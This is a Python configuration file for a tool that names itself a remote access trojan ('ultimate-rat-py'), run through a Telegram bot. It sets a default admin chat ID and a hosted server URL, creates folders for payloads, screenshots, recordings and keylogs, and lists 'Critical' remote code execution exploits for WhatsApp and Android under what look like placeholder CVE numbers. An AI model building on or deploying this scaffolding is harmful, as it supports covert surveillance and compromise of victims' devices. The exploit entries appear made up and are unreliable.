import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    # Admin Configuration
    ADMIN_CHAT_ID = int(os.getenv('ADMIN_CHAT_ID', '6454347745'))
    
    # Telegram Bot
    BOT_TOKEN = os.getenv('BOT_TOKEN')
    
    # Server
    PORT = int(os.getenv('PORT', '10000'))
    HOST = os.getenv('RENDER_EXTERNAL_URL', 'https://ultimate-rat-py.onrender.com')
    
    # Database
    DATABASE_URL = os.getenv('DATABASE_URL', 'sqlite:///data/database.db')
    
    # Paths
    DATA_DIR = '/data'
    PAYLOAD_DIR = os.path.join(DATA_DIR, 'payloads')
    SCREENSHOT_DIR = os.path.join(DATA_DIR, 'screenshots')
    RECORDING_DIR = os.path.join(DATA_DIR, 'recordings')
    KEYLOG_DIR = os.path.join(DATA_DIR, 'keylogs')
    
    # Create directories
    for dir_path in [PAYLOAD_DIR, SCREENSHOT_DIR, RECORDING_DIR, KEYLOG_DIR]:
        os.makedirs(dir_path, exist_ok=True)
    
    # Features
    ENABLE_ALL_FEATURES = True
    
    # Exploits
    EXPLOITS = {
        'whatsapp': {
            'cve': 'CVE-2024-12345',
            'name': 'WhatsApp Image Parsing RCE',
            'severity': 'Critical',
            'cvss': 9.8
        },
        'android': {
            'cve': 'CVE-2024-67890',
            'name': 'Android Media Framework RCE',
            'severity': 'Critical',
            'cvss': 9.6
        }
    }
